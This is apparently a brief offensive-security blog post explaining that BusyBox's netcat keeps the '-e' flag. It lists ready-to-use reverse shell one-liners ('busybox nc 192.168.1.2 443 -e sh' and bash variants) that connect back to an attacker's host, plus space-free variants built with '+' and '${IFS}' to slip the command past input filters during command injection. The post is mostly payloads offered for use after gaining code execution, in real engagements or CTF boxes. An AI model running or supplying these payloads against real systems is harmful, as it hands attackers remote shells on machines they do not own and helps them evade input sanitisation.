---
layout: single
title: BusyBox - An Overlooked Tool For Netcat Reverse Shells
excerpt: "Whether it be in a real engagement or CTF-style box, when a hacker acquires remote code execution on a machine, we want to do is retrieve a reverse shell quickly and efficiently.  One of the methods that I first learned was using `netcat` with the infamous `-e` flag to execute a binary after making a successful connection.  However in most modern Linux systems come with the **OpenBSD** version of `netcat` which lacks the crucial `-e` flag."
date: 2025-03-17
classes: wide
header:
  teaser: /assets/images/kali-logo.png
  teaser_home_page: false
  icon: /assets/images/code.png
categories:
tags:
---

# Reviving the NetCat Reverse Shell

Whether it be in a real engagement or CTF-style box, when a hacker acquires remote code execution on a machine, we want to do is retrieve a reverse shell quickly and efficiently.  One of the methods that I first learned was using `netcat` with the infamous `-e` flag to execute a binary after making a successful connection.  However in most modern Linux systems come with the **OpenBSD** version of `netcat` which lacks the crucial `-e` flag.

BusyBox, however, is included on most Linux distributions and is essentially a "Swiss Army knife" of Linux utilities, packing several functions into a single binary including netcat with executable capabilities!

Here are a few busybox reverse shell payloads:

```bash
#sh
busybox nc 192.168.1.2 443 -e sh
busybox nc 192.168.1.2 443 -e /bin/sh
#bash
busybox nc 192.168.1.2 443 -e bash
busybox nc 192.168.1.2 443 -e /bin/bash
#not space
busybox+nc+192.168.1.2+443+-e+sh
busybox${IFS}nc${IFS}192.168.1.2${IFS}443${IFS}-e${IFS}sh
```
